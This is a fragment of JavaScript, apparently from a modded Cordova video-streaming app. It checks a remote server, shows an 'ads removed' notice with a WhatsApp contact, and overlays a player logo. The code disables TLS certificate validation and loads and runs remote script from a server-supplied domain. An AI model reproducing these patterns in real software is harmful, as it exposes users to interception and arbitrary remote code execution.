    ...
    e && cordovaHTTP.acceptAllCerts(!0, function() {
        cordovaHTTP.get("https://m.kotakputih.casa/api/check.php", {}, {}, function(e) {
            ...
            if (assetdom = a.asset_dom, dom = a.dom, mvReq = a.mvReq, tvReq = a.tvReq, imgReq = a.imgReq, !t) {
                ...
                localStorage.notice && "15" == localStorage.notice || ($.alert("<div>Sakizu<br>- Hide Banner<br>- Ads Renoved<br>- Disable auto open web while playing video<br><br>if still showed <br><a href='https://api.whatsapp.com/send?phone=628995019601' style='color:#c6aa28;'>WhatsApp</a></div>"), localStorage.notice = "15"), $.getScript("https://task."+assetdom+"/chk/httpget/");
...
function appendLogo(e, t) {
    ...
    if ($(".jw-logo-top-left,.jw-logo-top-right").remove(), "kds" == t) $("div.jw-controls.jw-reset").append('<div class="jw-logo jw-reset jw-logo-top-right" style="opacity: 1; margin-left: 1.8%; margin-top: 2%; width: 28%; height: 11%; min-height: 6px; min-width: 65px; background-image: url(\'' + imgReq + "/images/indoxx1com.png');\"></div>");
